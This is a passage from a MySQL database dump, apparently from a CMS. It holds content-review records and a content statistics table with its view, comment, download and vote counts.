INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (36,-1,NULL,0,1,'2016-09-28 14:17:37');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (37,-1,NULL,0,1,'2016-09-28 14:17:37');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (39,-1,NULL,0,1,'2016-09-28 14:17:37');
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (43,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (44,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (45,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (46,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (47,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (48,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (49,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (50,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (51,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (53,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (55,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (57,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (59,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (61,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (63,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (69,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (71,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (72,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (100,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (101,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (102,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (103,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (104,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (105,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (106,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (107,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (108,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (109,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (110,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (111,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (112,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (113,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (114,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (115,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (116,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (117,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (118,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (119,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (120,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (121,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (122,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (123,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (124,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (125,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (126,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (127,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (128,3,NULL,1,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (129,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (130,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (131,3,NULL,1,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (132,3,NULL,1,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (140,3,NULL,0,NULL,NULL);
INSERT INTO `jc_content_check` (`content_id`,`check_step`,`check_opinion`,`is_rejected`,`reviewer`,`check_date`) VALUES (141,3,NULL,0,NULL,NULL);

#
# Source for table jc_content_count
#

CREATE TABLE `jc_content_count` (
  `content_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments` int(11) NOT NULL DEFAULT '0' COMMENT '总评论数',
  `comments_month` int(11) NOT NULL DEFAULT '0' COMMENT '月评论数',
  `comments_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周评论数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads` int(11) NOT NULL DEFAULT '0' COMMENT '总下载数',
  `downloads_month` int(11) NOT NULL DEFAULT '0' COMMENT '月下载数',
  `downloads_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周下载数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups` int(11) NOT NULL DEFAULT '0' COMMENT '总顶数',
  `ups_month` int(11) NOT NULL DEFAULT '0' COMMENT '月顶数',
  `ups_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周顶数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `downs` int(11) NOT NULL DEFAULT '0' COMMENT '总踩数',
  PRIMARY KEY (`content_id`),
  KEY `index_jc_content_count_views_day` (`views_day`),
  KEY `index_jc_content_count_views_week` (`views_week`),
  KEY `index_jc_content_count_views_month` (`views_month`),
  KEY `index_jc_content_count_views` (`views`),
  KEY `index_jc_content_count_comments_day` (`comments_day`),
  KEY `index_jc_content_count_comments_month` (`comments_month`),
  KEY `index_jc_content_count_comments_week` (`comments_week`),
  KEY `index_jc_content_count_comments` (`comments`),
  KEY `index_jc_content_count_downloads_day` (`downloads_day`),
  KEY `index_jc_content_count_downloads_month` (`downloads_month`),
  KEY `index_jc_content_count_downloads_week` (`downloads_week`),
  KEY `index_jc_content_count_downloads` (`downloads`),
  KEY `index_jc_content_count_ups_day` (`ups_day`),
  KEY `index_jc_content_count_ups_week` (`ups_week`),
  KEY `index_jc_content_count_ups_month` (`ups_month`),
  KEY `index_jc_content_count_ups` (`ups`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容计数表';

#
# Dumping data for table jc_content_count
#

INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (2,14,13,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (7,38,33,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (11,21,20,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (12,10,10,1,1,0,0,0,0,0,0,0,0,1,1,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (13,20,15,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (14,58,44,21,21,0,0,0,0,0,0,0,0,14,14,14,14,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (23,16,16,16,16,0,0,0,0,0,0,0,0,12,12,12,12,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (27,9,9,1,1,0,0,0,0,0,0,0,0,2,2,2,2,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (28,9,9,4,4,0,0,0,0,0,0,0,0,2,2,2,2,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (29,3,3,1,1,0,0,0,0,0,0,0,0,1,1,1,1,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (30,63,63,54,54,1,1,1,1,0,0,0,0,44,44,44,44,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (32,5,5,2,2,0,0,0,0,0,0,0,0,2,2,1,1,1);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (33,54,54,18,18,0,0,0,0,0,0,0,0,18,18,18,18,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (36,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (37,12,12,2,2,0,0,0,0,0,0,0,0,2,2,1,1,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (39,34,34,27,27,1,1,1,1,0,0,0,0,17,17,17,17,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (43,3,3,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (44,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (45,19,19,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (46,19,19,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (47,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (48,3,3,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (49,18,18,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (50,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (51,17,17,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (53,3,3,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (57,4,4,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (59,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (61,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (63,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (69,48,48,16,16,0,0,0,0,1,1,1,1,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (71,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (72,6,6,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (100,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (101,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (102,16,16,16,16,0,0,0,0,39,39,1,39,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (103,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (104,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (105,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (106,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (107,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (108,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (109,16,16,16,16,0,0,0,0,21,21,1,21,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (110,4,4,4,4,0,0,0,0,1,1,1,1,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (111,16,16,16,16,0,0,0,0,0,0,0,0,12,12,12,12,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (112,17,17,17,17,0,0,0,0,0,0,0,0,16,16,16,16,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (113,29,29,29,29,0,0,0,0,0,0,0,0,13,13,13,13,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (114,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (115,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (116,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (117,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (118,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
